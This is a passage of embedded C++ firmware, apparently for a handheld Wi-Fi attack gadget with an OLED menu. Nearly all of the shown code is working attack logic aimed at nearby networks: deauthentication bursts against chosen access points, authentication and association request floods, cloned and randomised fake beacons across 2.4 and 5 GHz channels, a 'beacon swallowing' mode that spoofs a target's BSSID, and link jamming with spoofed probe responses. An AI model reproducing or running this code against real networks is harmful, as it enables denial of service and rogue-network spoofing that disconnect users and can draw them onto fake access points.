    g_deauthState.lastUIUpdateMs = now;
  }
  
  // +
  if (!SelectedVector.empty()) {
    for (int selectedIndex : SelectedVector) {
      if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
        String ssid1 = scan_results[selectedIndex].ssid;
        setChannelOptimized(scan_results[selectedIndex].channel);
        
        // 
        const int cloneCount = 6;
        uint8_t tempMac[6];
        for (int c = 0; c < cloneCount; c++) {
          generateRandomMAC(tempMac);
          for (int x = 0; x < 10; x++) {
            wifi_tx_beacon_frame(tempMac, (void *)BROADCAST_MAC, ssid1.c_str());
          }
        }
        
        // 
        if (g_enhancedDeauthMode) {
          sendDeauthBatchEnhanced(scan_results[selectedIndex].bssid, 
                                  g_deauthState.packetsPerCycle, 
                                  g_deauthState.packetCount);
        } else {
          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 1, 1, g_deauthState.packetCount, 5);
          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 4, 1, g_deauthState.packetCount, 5);
          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 16, 1, g_deauthState.packetCount, 5);
        }
        
        // LED
        if (g_deauthState.packetCount >= 100) {
          digitalWrite(LED_R, HIGH);
          delay(10);
          digitalWrite(LED_R, LOW);
          g_deauthState.packetCount = 0;
        }
        break; // 
      }
    }
  }
}

// ：
void AutoMulti() {
  startAutoMultiAttack();
  // 
  while (g_deauthState.running) {
    processAutoMultiAttack();
  }
}
// ：
void All() {
  startAllAttack();
  // 
  while (g_deauthState.running) {
    processAllAttack();
  }
}


// ：
void BeaconDeauth() {
  startBeaconDeauthAttack();
  // 
  while (g_deauthState.running) {
    processBeaconDeauthAttack();
  }
}
void generateRandomMAC(uint8_t* mac) {
  for (int i = 0; i < 6; i++) {
    mac[i] = random(0, 256);
  }
  // MAC
  mac[0] &= 0xFC; // 
  mac[0] |= 0x02; // 
}

// ===== =====
// SSID
String generateRandomSuffix() {
  String suffix = "";
  suffix += char('a' + (random(0,26)));
  suffix += char('a' + (random(0,26)));
  return suffix;
}

// SSID
String createFakeSSID(const String& originalSSID) {
  return originalSSID + String("(") + generateRandomSuffix() + String(")");
}

// 
void sendBeaconOnChannel(int channel, const char* ssid, int cloneCount, int sendCount, int delayMs = 0) {
  wext_set_channel(WLAN0_NAME, channel);
  for (int c = 0; c < cloneCount; c++) {
    uint8_t tempMac[6];
    generateRandomMAC(tempMac);
    String fakeSsid = createFakeSSID(String(ssid));
    const char *fakeSsidCstr = fakeSsid.c_str();
    
    for (int x = 0; x < sendCount; x++) {
      wifi_tx_beacon_frame(tempMac, (void *)BROADCAST_MAC, fakeSsidCstr);
      if (delayMs > 0) delay(delayMs);
    }
    if (delayMs > 0) delay(delayMs * 2); // 
  }
}

// ===== ： =====

// ：
void drawLinkJammerStatusPage(const String& ssid, bool clearDisplay = true) {
  if (clearDisplay) {
    display.clearDisplay();
  }
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  
  // 
  oledDrawCenteredLine("[CI Running]", 18);
  
  // SSID
  oledDrawCenteredLine(ssid.c_str(), 32);
  
  // 
  const char* bottomHint = "Stay near client";
  int hintWidth = u8g2_for_adafruit_gfx.getUTF8Width(bottomHint);
  int hintX = (display.width() - hintWidth) / 2;
  u8g2_for_adafruit_gfx.setCursor(hintX, 46);
  u8g2_for_adafruit_gfx.print(bottomHint);
  
  if (clearDisplay) {
    display.display();
  }
}

// ：
void drawBeaconTamperStatusPage(const String& status, bool clearDisplay = true) {
  if (clearDisplay) {
    display.clearDisplay();
  }
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  
  // 
  oledDrawCenteredLine("[BBH Running]", 18);
  
  // 
  oledDrawCenteredLine(status.c_str(), 32);
  
  // 
  const char* bottomHint = "Swallowing beacons";
  int hintWidth = u8g2_for_adafruit_gfx.getUTF8Width(bottomHint);
  int hintX = (display.width() - hintWidth) / 2;
  u8g2_for_adafruit_gfx.setCursor(hintX, 46);
  u8g2_for_adafruit_gfx.print(bottomHint);
  
  if (clearDisplay) {
    display.display();
  }
}

// ===== ：/ =====
void drawRequestFloodStatus(const String& ssid, bool clearDisplay = true) {
  if (clearDisplay) {
    display.clearDisplay();
  }
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  oledDrawCenteredLine("[DoS Sending]", 18);
  oledDrawCenteredLine(ssid.c_str(), 32);
  if (clearDisplay) display.display();
}

void RequestFlood() {
  if (SelectedVector.empty()) {
    showModalMessage("No valid SSID");
    return;
  }

  // SSID，
  String displaySSID = scan_results[SelectedVector[0]].ssid;
  if (SelectedVector.size() > 1) {
    displaySSID = "Multi target...";
  }

  drawRequestFloodStatus(displaySSID);
  startAttackLED();

  // 
  struct TargetInfo {
    String ssid;
    const uint8_t* bssid;
    int channel;
  };
  
  std::vector<TargetInfo> targets;
  targets.reserve(SelectedVector.size());
  
  for (int selectedIndex : SelectedVector) {
    if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
      TargetInfo target;
      target.ssid = scan_results[selectedIndex].ssid;
      target.bssid = scan_results[selectedIndex].bssid;
      target.channel = scan_results[selectedIndex].channel;
      targets.push_back(target);
    }
  }

  uint8_t staMac[6];
  AuthReqFrame arf; size_t arflen;
  AssocReqFrame asf; size_t asflen;

  while (true) {
    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
      digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
      delay(200);
      stabilizeButtonState();
      if (showConfirmModal("Stop DoS")) {
        break;
      } else {
        startAttackLED();
        drawRequestFloodStatus(displaySSID);
      }
    }

    // 
    for (const auto& target : targets) {
      wext_set_channel(WLAN0_NAME, target.channel);

      // STA MAC，
      generateRandomMAC(staMac);
      arflen = wifi_build_auth_req(staMac, (void*)target.bssid, arf);
      asflen = wifi_build_assoc_req(staMac, (void*)target.bssid, target.ssid.c_str(), asf);

      // ：，
      for (int i = 0; i < 20; i++) { wifi_tx_raw_frame(&arf, arflen); }
      for (int i = 0; i < 25; i++) { wifi_tx_raw_frame(&asf, asflen); }
      
      // ，
    }
  }
}

void LinkJammer() {
  if (SelectedVector.empty()) {
    showModalMessage("No valid SSID");
    return;
  }

  // SSID，
  String displaySSID = scan_results[SelectedVector[0]].ssid;
  if (SelectedVector.size() > 1) {
    displaySSID = "Multi target...";
  }

  // 
  drawLinkJammerStatusPage(displaySSID);
  
  // LED
  startAttackLED();

  // 
  struct TargetFrame {
    String ssid;
    const uint8_t* bssid;
    int channel;
    BeaconFrame bf;
    size_t blen;
    ProbeRespFrame prf;
    size_t prlen;
  };
  
  std::vector<TargetFrame> targets;
  targets.reserve(SelectedVector.size());
  
  for (int selectedIndex : SelectedVector) {
    if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
      TargetFrame target;
      target.ssid = scan_results[selectedIndex].ssid;
      target.bssid = scan_results[selectedIndex].bssid;
      target.channel = scan_results[selectedIndex].channel;
      
      // 
      uint8_t tempMac[6];
      memcpy(tempMac, target.bssid, 6);
      target.blen = wifi_build_beacon_frame(tempMac, (void*)BROADCAST_MAC, target.ssid.c_str(), target.bf);
      target.prlen = wifi_build_probe_resp_frame(tempMac, (void*)BROADCAST_MAC, target.ssid.c_str(), target.prf);
      
      targets.push_back(target);
    }
  }

  // ：
  std::vector<int> channels;
  channels.reserve(sizeof(allChannels)/sizeof(allChannels[0]));
  for (int ch : allChannels) channels.push_back(ch);



  while (true) {
    // ：OK/BACK -> 
    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
      digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
      delay(200);
      // ，
      stabilizeButtonState();
      if (showConfirmModal("Stop CI")) {
        break;
      } else {
        // ，LED
        startAttackLED();
        drawLinkJammerStatusPage(displaySSID);
      }
    }

    for (int ch : channels) {
      // 
      if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
        digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
        delay(200);
        // ，
        stabilizeButtonState();
        if (showConfirmModal("Stop CI")) {
          return; // ，
        } else {
          // ，LED
          startAttackLED();
          drawLinkJammerStatusPage(displaySSID);
        }
      }
      
      wext_set_channel(WLAN0_NAME, ch);
      
      // ，
      for (const auto& target : targets) {
        // ，
        for (int i = 0; i < 25; i++) {
          wifi_tx_raw_frame((void*)&target.bf, target.blen);
        }
        for (int i = 0; i < 30; i++) {
          wifi_tx_raw_frame((void*)&target.prf, target.prlen);
        }
        // ，
      }
      // ，
    }
  }
}

void BeaconTamper() {
  if (SelectedVector.empty()) {
    if (showSelectSSIDConfirmModal()) {
      drawssid(); // AP/SSID
    }
    return;
  }

  // SSID，
  String displaySSID = scan_results[SelectedVector[0]].ssid;
  if (SelectedVector.size() > 1) {
    displaySSID = "Multi swallow...";
  }

  // 
  drawBeaconTamperStatusPage(displaySSID);
  
  // LED
  startAttackLED();

  // 
  struct TargetFrame {
    String ssid;
    const uint8_t* bssid;
    int channel;
    BeaconFrame bf;
    size_t blen;
    ProbeRespFrame prf;
    size_t prlen;
  };
  
  std::vector<TargetFrame> targets;
  targets.reserve(SelectedVector.size());
  
  // AP
  for (int selectedIndex : SelectedVector) {
    if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
      TargetFrame target;
      target.ssid = "[Swallowed]";  // SSID
      target.bssid = scan_results[selectedIndex].bssid;
      target.channel = scan_results[selectedIndex].channel;
      
      // 
      uint8_t tempMac[6];
      memcpy(tempMac, target.bssid, 6);
      target.blen = wifi_build_beacon_frame(tempMac, (void*)BROADCAST_MAC, target.ssid.c_str(), target.bf);
      target.prlen = wifi_build_probe_resp_frame(tempMac, (void*)BROADCAST_MAC, target.ssid.c_str(), target.prf);
      
      targets.push_back(target);
    }
  }

  // ：
  std::vector<int> channels;
  channels.reserve(sizeof(allChannels)/sizeof(allChannels[0]));
  for (int ch : allChannels) channels.push_back(ch);

  while (true) {
    // ：OK/BACK -> 
    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
      digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
      delay(200);
      // ，
      stabilizeButtonState();
      if (showConfirmModal("Stop BBH")) {
        break;
      } else {
        // ，LED
        startAttackLED();
        drawBeaconTamperStatusPage(displaySSID);
      }
    }

    for (int ch : channels) {
      // 
      if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
        digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
        delay(200);
        // ，
        stabilizeButtonState();
        if (showConfirmModal("Stop BBH")) {
          return; // ，
        } else {
          // ，LED
          startAttackLED();
          drawBeaconTamperStatusPage(displaySSID);
        }
      }
      
      wext_set_channel(WLAN0_NAME, ch);
      
      // ，
      for (const auto& target : targets) {
        // ，
        for (int i = 0; i < 25; i++) {
          wifi_tx_raw_frame((void*)&target.bf, target.blen);
        }
        for (int i = 0; i < 30; i++) {
          wifi_tx_raw_frame((void*)&target.prf, target.prlen);
        }
        // ，
      }
      // ，
    }
  }
}

// （Web UI，BeaconFrame）
void sendBeaconOnChannelWeb(int channel, const char* ssid, int cloneCount, int sendCount, int delayMs = 0) {
  wext_set_channel(WLAN0_NAME, channel);
  for (int c = 0; c < cloneCount; c++) {
    uint8_t tempMac[6];
    generateRandomMAC(tempMac);
    // WebUI：""，；<=32
    // "(ab)"，4（ASCII）。
    int maxBaseBytes = 32 - 4; if (maxBaseBytes < 0) maxBaseBytes = 0;
    String base = utf8TruncateByBytes(String(ssid), maxBaseBytes);
    String fakeSsid = createFakeSSID(base);
    const char *fakeSsidCstr = fakeSsid.c_str();
    
    BeaconFrame bf; 
    size_t blen = wifi_build_beacon_frame(tempMac, (void *)BROADCAST_MAC, fakeSsidCstr, bf);
    
    for (int x = 0; x < sendCount; x++) {
      wifi_tx_raw_frame(&bf, blen);
      if (delayMs > 0) delay(delayMs);
    }
    if (delayMs > 0) delay(delayMs * 2); // 
  }
}

// 
void executeCrossBandBeaconAttack(const String& ssid, int originalChannel, bool isStableMode = false) {
  // 
  struct AttackConfig {
    int originalCloneCount;
    int originalSendCount;
    int crossCloneCount;
    int crossSendCount;
    int delayMs;
  };
  
  AttackConfig config;
  if (isStableMode) {
    // 
    config = {5, 3, 4, 2, 2};
  } else {
    // 
    config = {10, 5, 8, 4, 0};
  }
  
  if (is24GChannel(originalChannel)) {
    // 2.4GSSID：5G
    
    // 2.4G
    if ((beaconBandMode == 0) || (beaconBandMode == 2)) {
      sendBeaconOnChannel(originalChannel, ssid.c_str(), 
                         config.originalCloneCount, config.originalSendCount, config.delayMs);
    }
    
    // 5G（5G）
    if ((beaconBandMode == 0) || (beaconBandMode == 1)) {
      int fiveGChannels[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
      for (int fiveGCh : fiveGChannels) {
        sendBeaconOnChannel(fiveGCh, ssid.c_str(), 
                           config.crossCloneCount, config.crossSendCount, config.delayMs);
        if (isStableMode) delay(5); // ，
      }
    }
  } else if (is5GChannel(originalChannel)) {
    // 5GSSID：2.4G
    
    // 5G
    if ((beaconBandMode == 0) || (beaconBandMode == 1)) {
      sendBeaconOnChannel(originalChannel, ssid.c_str(), 
                         config.originalCloneCount, config.originalSendCount, config.delayMs);
    }
    
    // 2.4G（2.4G）
    if ((beaconBandMode == 0) || (beaconBandMode == 2)) {
      int two4GChannels[] = {1, 6, 11}; // 2.4G
      for (int two4GCh : two4GChannels) {
        sendBeaconOnChannel(two4GCh, ssid.c_str(), 
                           config.crossCloneCount, config.crossSendCount, config.delayMs);
        if (isStableMode) delay(5); // ，
      }
    }
  }
}
// （Web UI）
void executeCrossBandBeaconAttackWeb(const String& ssid, int originalChannel, bool isStableMode = false) {
  // 
  struct AttackConfig {
    int originalCloneCount;
    int originalSendCount;
    int crossCloneCount;
    int crossSendCount;
    int delayMs;
  };
  
  AttackConfig config;
  if (isStableMode) {
    // 
    config = {10, 3, 4, 2, 2};
  } else {
    // 
    config = {10, 5, 8, 4, 0};
  }
  
  if (is24GChannel(originalChannel)) {
    // 2.4GSSID：5G
    
    // 2.4G
    if ((beaconBandMode == 0) || (beaconBandMode == 2)) {
      sendBeaconOnChannelWeb(originalChannel, ssid.c_str(), 
                             config.originalCloneCount, config.originalSendCount, config.delayMs);
    }
    
    // 5G（5G）
    if ((beaconBandMode == 0) || (beaconBandMode == 1)) {
      int fiveGChannels[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
      for (int fiveGCh : fiveGChannels) {
        sendBeaconOnChannelWeb(fiveGCh, ssid.c_str(), 
                               config.crossCloneCount, config.crossSendCount, config.delayMs);
        if (isStableMode) delay(3); // ，
      }
    }
  } else if (is5GChannel(originalChannel)) {
    // 5GSSID：2.4G
    
    // 5G
    if ((beaconBandMode == 0) || (beaconBandMode == 1)) {
      sendBeaconOnChannelWeb(originalChannel, ssid.c_str(), 
                             config.originalCloneCount, config.originalSendCount, config.delayMs);
    }
    
    // 2.4G（2.4G）
    if ((beaconBandMode == 0) || (beaconBandMode == 2)) {
      int two4GChannels[] = {1, 6, 11}; // 2.4G
      for (int two4GCh : two4GChannels) {
        sendBeaconOnChannelWeb(two4GCh, ssid.c_str(), 
                               config.crossCloneCount, config.crossSendCount, config.delayMs);
        if (isStableMode) delay(3); // ，
      }
    }
  }
}
void Beacon() {
  Serial.println("=== Start Clone Force ===");
  Serial.println("Mode: Clone Force");
  Serial.println("Power: 10");
  
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  oledDrawCenteredLine("Cloning beacon...", 25);
  
  // LED：
  startAttackLED();

  unsigned long prevBlink = 0;
  bool redState = true;
  const int blinkInterval = 800;

  // OLED：SSID，0.5s，1s
  const int ssidLineY = 42;
  static unsigned long lastSSIDDrawMs = 0;
  bool singleTargetDrawn = false;

  while (true) {
    unsigned long now = millis();
    
    if (now - prevBlink >= blinkInterval) {
      redState = !redState;
      digitalWrite(LED_R, redState ? HIGH : LOW);
      prevBlink = now;
    }
    
    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      delay(200);
      // 
      if (showConfirmModal("Stop attack?")) {
        BeaconMenu();
        break;
      }
      // ，LED
      startAttackLED();
      // ，
      display.clearDisplay();
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      oledDrawCenteredLine("Cloning beacon...", 25);
    }

    if (!SelectedVector.empty()) {
      // ：；：1s
      unsigned long intervalMs = (SelectedVector.size() > 1) ? 1000UL : 0UL;
      for (int selectedIndex : SelectedVector) {
        if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
          String ssid1 = scan_results[selectedIndex].ssid;
          int ch = scan_results[selectedIndex].channel;
          
          // （）
          executeCrossBandBeaconAttack(ssid1, ch, false);

          // ；
          if (SelectedVector.size() == 1) {
            if (!singleTargetDrawn) {
              String fakeName = createFakeSSID(ssid1);
              oledDrawCenteredLine(fakeName.c_str(), ssidLineY);
              singleTargetDrawn = true;
            }
          } else {
            String fakeName = createFakeSSID(ssid1);
            oledMaybeDrawCenteredLine(fakeName.c_str(), ssidLineY, lastSSIDDrawMs, intervalMs);
          }
        }
      }
    } else {
      // SSID，（，1s）
      const unsigned long intervalMs = 1000UL;
      for (size_t i = 0; i < scan_results.size(); i++) {
        String ssid1 = scan_results[i].ssid;
        int ch = scan_results[i].channel;
        
        // （）
        executeCrossBandBeaconAttack(ssid1, ch, false);

        String fakeName = createFakeSSID(ssid1);
        oledMaybeDrawCenteredLine(fakeName.c_str(), ssidLineY, lastSSIDDrawMs, intervalMs);
      }
    }
  }
}

void StableBeacon() {
  Serial.println("=== Start Clone Stable ===");
  Serial.println("Mode: Clone Stable");
  Serial.println("Power: 5 (Stable)");
  
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  oledDrawCenteredLine("Cloning beacon...", 25);
  
  // LED：
  startAttackLED();

  unsigned long prevBlink = 0;
  bool redState = true;
  const int blinkInterval = 800;

  // OLED：SSID，0.5s，1s
  const int ssidLineY = 42;
  static unsigned long lastSSIDDrawMs = 0;
  bool singleTargetDrawn = false;

  while (true) {
    unsigned long now = millis();
    
    if (now - prevBlink >= blinkInterval) {
      redState = !redState;
      digitalWrite(LED_R, redState ? HIGH : LOW);
      prevBlink = now;
    }
    
    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      delay(200);
      // 
      if (showConfirmModal("Stop attack?")) {
        BeaconMenu();
        break;
      }
      // ，LED
      startAttackLED();
      // ，
      display.clearDisplay();
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      oledDrawCenteredLine("Cloning beacon...", 25);
    }

    if (!SelectedVector.empty()) {
      unsigned long intervalMs = (SelectedVector.size() > 1) ? 1000UL : 0UL;
      for (int selectedIndex : SelectedVector) {
        if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
          String ssid1 = scan_results[selectedIndex].ssid;
          int ch = scan_results[selectedIndex].channel;
          
          // （）
          executeCrossBandBeaconAttack(ssid1, ch, true);

          // ；
          if (SelectedVector.size() == 1) {
            if (!singleTargetDrawn) {
              String fakeName = createFakeSSID(ssid1);
              oledDrawCenteredLine(fakeName.c_str(), ssidLineY);
              singleTargetDrawn = true;
            }
          } else {
            String fakeName = createFakeSSID(ssid1);
            oledMaybeDrawCenteredLine(fakeName.c_str(), ssidLineY, lastSSIDDrawMs, intervalMs);
          }
        }
      }
    } else {
      // SSID，（，1s）
      const unsigned long intervalMs = 1000UL;
      for (size_t i = 0; i < scan_results.size(); i++) {
        String ssid1 = scan_results[i].ssid;
        int ch = scan_results[i].channel;
        
        // （）
        executeCrossBandBeaconAttack(ssid1, ch, true);

        String fakeName = createFakeSSID(ssid1);
        oledMaybeDrawCenteredLine(fakeName.c_str(), ssidLineY, lastSSIDDrawMs, intervalMs);
      }
    }
  }
}
// OLED ： / 5G / 2.4G
// true beaconBandMode； false （BACK）
bool BeaconBandMenu() {
  int state = beaconBandMode; // 
  
  while (true) {
    if (digitalRead(BTN_BACK) == LOW) {
      delay(200);
      return false;
    }
    if (digitalRead(BTN_OK) == LOW) {
      delay(200);
      beaconBandMode = state;
      return true;
    }
    if (digitalRead(BTN_UP) == LOW) {
      delay(200);
      if (state > 0) state--;
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      delay(200);
      if (state < 2) state++;
    }

    display.clearDisplay();
    display.setTextSize(1);
    
    // 
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(32, 12);
    u8g2_for_adafruit_gfx.print("[TX Band]");
    
    // ：，5G，2.4G
    const char* items[] = {"Mixed Dual", "5G Band", "2.4G Band"};
    for (int i = 0; i < 3; i++) {
      int yPos = 20 + i * 16; // 20，
      if (i == state) {
        display.fillRoundRect(0, yPos-2, display.width(), 14, 2, SSD1306_WHITE);
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
        u8g2_for_adafruit_gfx.print(items[i]);
        drawRightChevron(yPos-2, 14, true);
      } else {
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
        u8g2_for_adafruit_gfx.print(items[i]);
        drawRightChevron(yPos-2, 14, false);
      }
    }
    display.display();
    delay(50);
  }
}
String generateRandomString(int len){
  String randstr = "";
  const char setchar[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (int i = 0; i < len; i++){
    int index = random(0,strlen(setchar));
    randstr += setchar[index];

  }
  return randstr;
}
char randomString[19];
void RandomBeacon() {
  Serial.println("=== Random Beacon ===");
  Serial.println("Mode: Random Bcn");
  Serial.println("Power: 10");
  
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  oledDrawCenteredLine("Random beacon...", 25);
  
  // LED：
  startAttackLED();

  unsigned long prevBlink = 0;
  bool redState = true;
  const int blinkInterval = 800;

  // OLED："Attacking..."SSID（）
  const int ssidLineY = 42; // 
  static unsigned long lastSSIDDrawMs = 0;
  const unsigned long randomSSIDIntervalMs = 500; // 0.5s 

  std::vector<int> targetChannels;
  
  if (!SelectedVector.empty()) {
    for (int selectedIndex : SelectedVector) {
      if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
        int channel = scan_results[selectedIndex].channel;
        bool channelExists = false;
        for (int existingChannel : targetChannels) {
          if (existingChannel == channel) {
            channelExists = true;
            break;
          }
        }
        if (!channelExists) {
          // 
          bool include = (beaconBandMode == 0) || (beaconBandMode == 2 && is24GChannel(channel)) || (beaconBandMode == 1 && is5GChannel(channel));
          if (include) targetChannels.push_back(channel);
        }
      }
    }
  } else {
    for (int channel : allChannels) {
      bool include = (beaconBandMode == 0) || (beaconBandMode == 2 && is24GChannel(channel)) || (beaconBandMode == 1 && is5GChannel(channel));
      if (include) targetChannels.push_back(channel);
    }
  }

  while (true) {
    unsigned long now = millis();
    
    if (now - prevBlink >= blinkInterval) {
      redState = !redState;
      digitalWrite(LED_R, redState ? HIGH : LOW);
      prevBlink = now;
    }
    
    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      delay(200);
      // 
      if (showConfirmModal("Stop attack?")) {
        BeaconMenu();
        break;
      }
      // ，LED
      startAttackLED();
      // ，
      display.clearDisplay();
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      oledDrawCenteredLine("Random beacon...", 25);
    }

    int randomIndex = random(0, targetChannels.size());
    int randomChannel = targetChannels[randomIndex];
    
    String ssid2 = generateRandomString(10);
    
    for (int i = 0; i < 6; i++) {
      byte randomByte = random(0x00, 0xFF);
      snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
    }
    
    const char * ssid_cstr2 = ssid2.c_str();
    wext_set_channel(WLAN0_NAME, randomChannel);
    
    for (int x = 0; x < 5; x++) {
      wifi_tx_beacon_frame(randomString, (void *)BROADCAST_MAC, ssid_cstr2);
    }

    // ：，
    if (beaconBandMode == 0) {
      // ：
      int altCh = is24GChannel(randomChannel) ? 36 : 6;
      wext_set_channel(WLAN0_NAME, altCh);
      for (int x = 0; x < 2; x++) {
        wifi_tx_beacon_frame(randomString, (void *)BROADCAST_MAC, ssid_cstr2);
      }
    }

    // OLEDSSID（0.5，）
    oledMaybeDrawCenteredLine(ssid_cstr2, ssidLineY, lastSSIDDrawMs, randomSSIDIntervalMs);
  }
}
int becaonstate = 0;

void BeaconMenu(){
  becaonstate = 0;
  
  // ，/
  unsigned long lastUpTime = 0;
  unsigned long lastDownTime = 0;
  unsigned long lastBackTime = 0;
  unsigned long lastOkTime = 0;
  
  while (true) {
    unsigned long currentTime = millis();
    if(digitalRead(BTN_BACK)==LOW) {
      if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
      drawattack();
      break;
    }
    if(digitalRead(BTN_OK)==LOW){
      if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
      stabilizeButtonState(); // ：
      if(becaonstate == 0){
        if (BeaconBandMenu()) {
          if (showConfirmModal("Random beacon?")) {
            RandomBeacon();
            break;
          }
        }
        // 
      }
      if(becaonstate == 1){
        if (SelectedVector.empty()) { 
          if (showSelectSSIDConfirmModal()) {
            drawssid(); // AP/SSID
          }
        }
        else {
          if (BeaconBandMenu()) {
            if (showConfirmModal("Beacon attack?")) {
              Beacon();
              break;
            }
          }
        }
        // 
      }
      if(becaonstate == 2){
        if (SelectedVector.empty()) { 
          if (showSelectSSIDConfirmModal()) {
            drawssid(); // AP/SSID
          }
        }
        else {
          if (BeaconBandMenu()) {
            if (showConfirmModal("Beacon attack?")) {
              StableBeacon();
              break;
            }
          }
        }
        // 
      }
      if(becaonstate == 3){
        drawattack();
        break;
      }
      lastOkTime = currentTime;
    }
    if(digitalRead(BTN_UP)==LOW){
      if (currentTime - lastUpTime <= DEBOUNCE_DELAY) continue;
      if(becaonstate > 0){
        int yFrom = 2 + becaonstate * 16;
        becaonstate--;
        int yTo = 2 + becaonstate * 16;
        animateMoveFullWidth(yFrom, yTo, 14, drawBeaconMenuBase_NoFlush, 2);
      }
      lastUpTime = currentTime;
    }
    if(digitalRead(BTN_DOWN)==LOW){
      if (currentTime - lastDownTime <= DEBOUNCE_DELAY) continue;
      if(becaonstate < 3){
        int yFrom = 2 + becaonstate * 16;
        becaonstate++;
        int yTo = 2 + becaonstate * 16;
        animateMoveFullWidth(yFrom, yTo, 14, drawBeaconMenuBase_NoFlush, 2);
      }
      lastDownTime = currentTime;
    }
    
    display.clearDisplay();
    display.setTextSize(1);
    
    // 
    const char* menuItems[] = {
      "Random Beacon",
      "Clone AP (Force)",
      "Clone AP (Stable)",
      "《 Back 》"
    };
    
    // - 14，2，16，128x64
    for (int i = 0; i < 4; i++) {
      int yPos = 2 + i * 16;
      if (i == becaonstate) {
        display.fillRoundRect(0, yPos-2, display.width(), 14, 2, SSD1306_WHITE);
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
        u8g2_for_adafruit_gfx.print(menuItems[i]);
        drawRightChevron(yPos-2, 14, true);
      } else {
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
        u8g2_for_adafruit_gfx.print(menuItems[i]);
        drawRightChevron(yPos-2, 14, false);
      }
    }
    
    display.display();
    delay(50);
  }
}

// ：，，burst interFrameDelayMs
void StableAutoMulti() {
  Serial.println("=== Start Stable Auto Multi ===");
  Serial.println("Mode: Stable Auto");
  Serial.println("Power: " + String(perdeauth));
  
  showAttackStatusPage("Stable auto multi...");
  
  // LED：
  startAttackLED();

  unsigned long prevBlink = 0;
  bool redState = true;
  const int blinkInterval = 600;
  unsigned long buttonCheckTime = 0;
  const int buttonCheckInterval = 120;

  // （ AutoMulti ）
